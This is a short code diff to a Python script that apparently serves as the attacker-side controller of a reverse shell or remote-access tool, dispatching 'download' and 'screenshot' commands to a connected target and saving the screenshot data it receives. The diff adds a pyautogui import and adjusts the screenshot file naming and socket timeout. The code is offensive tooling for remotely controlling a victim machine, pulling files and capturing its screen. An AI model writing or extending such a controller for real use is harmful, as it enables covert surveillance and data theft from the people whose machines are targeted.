@@ -2,6 +2,7 @@ import socket
 from termcolor import colored
 import json
 import os
+import pyautogui
 
 def receive():
     data = ''
@@ -53,8 +54,8 @@ def target_communication():
         elif command[:8] == 'download':
             download_file(command[9:])
         elif command[:10] == 'screenshot':
-                file = open(f'screenshot{count}.png', 'wb')
-                target.settimeout(3)
+                file = open('screen%d' % (count), 'wb')
+                target.settimeout(5)
                 chunk = target.recv(1024)
                 while chunk:
                     file.write(chunk)
